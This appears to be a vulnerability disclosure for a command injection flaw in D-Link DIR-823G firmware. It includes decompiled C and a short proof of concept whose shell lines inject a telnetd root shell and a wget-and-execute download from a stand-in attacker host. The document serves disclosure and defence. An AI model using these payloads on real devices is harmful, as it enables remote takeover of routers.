# Command Injection Vulnerability in `/var/system/linux_vlan_reinit`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-823G Router                                       |
| Firmware Version     | **DIR823G_V1.0.2B05_20181207.bin** (other versions require verification) |
| Vulnerability Type   | **Command Injection**                                        |
| Vulnerable Component | `timelycheck` and `sysconf` binaries                         |
| Prerequisites        | Requires control over `/var/system/linux_vlan_reinit` content or filesystem write permissions (local or remote) |

2. Exploitation Path

```c
// timelycheck / sysconf
int sub_40A240()
{
  ...
  v0 = sub_402864("/var/system/linux_vlan_reinit");
  v1 = 0;
  if ( v0 )
  {
    v2 = fopen("/var/system/linux_vlan_reinit", "r");
    v1 = -1;
    if ( v2 )
    {
      memset(v9, 0, 256);
      fgets(v9, 256, v2);
      v3 = (const char *)strtok_r(v9, ":", &v8);
      if ( !v3 )
        goto LABEL_11;
      while ( !memcmp(v3, "eth", 3) || !memcmp(v3, "wlan", 4) )
      {
        sub_408FC8("ifconfig %s down", v3);
        sub_408FC8("vconfig rem %s", v3);
        ...
}

// timelycheck / sysconf
int sub_408FC8(const char *a1, ...)
{
  int result; // $v0
  _BYTE v2[260]; // [sp+1Ch] [-104h] BYREF
  va_list va; // [sp+12Ch] [+Ch] BYREF

  va_start(va, a1);
  result = vsnprintf(v2, 256, a1, (int *)va);
  if ( result >= 0 )
  {
    system(v2);
    return 0;
  }
  return result;
}
```

3. **Vulnerable Binaries:** `timelycheck` and `sysconf`, This vulnerability exists independently in both binaries and does not cross binary boundaries.

4. 0-Day Command Injection Exploitation Path:

   - Line 14: `fgets(v9, 256, v2)` reads content from `/var/system/linux_vlan_reinit`. The code only checks the prefix using `memcmp(v3, "eth", 3)` or `memcmp(v3, "wlan", 4)`, without performing any escaping or filtering. The input is concatenated at line 20 via `sub_408FC8("ifconfig %s down", v3)` and ultimately passed to line 36: `system(v2)`, leading to a command injection vulnerability.

   - Line 14: `fgets(v9, 256, v2)` reads content from `/var/system/linux_vlan_reinit`. The code only checks the prefix using `memcmp(v3, "eth", 3)` or `memcmp(v3, "wlan", 4)`, without performing any escaping or filtering. The input is concatenated at line 21 via `sub_408FC8("vconfig rem %s", v3)` and ultimately passed to line 36: `system(v2)`, leading to a command injection vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability:

```bash
# Create a malicious configuration file
echo "eth0; telnetd -l /bin/sh -p 4444; reboot" > /var/system/linux_vlan_reinit
echo "wlan0; wget http://attacker.com/malware -O /tmp/exp; sh /tmp/exp" >> /var/system/linux_vlan_reinit
```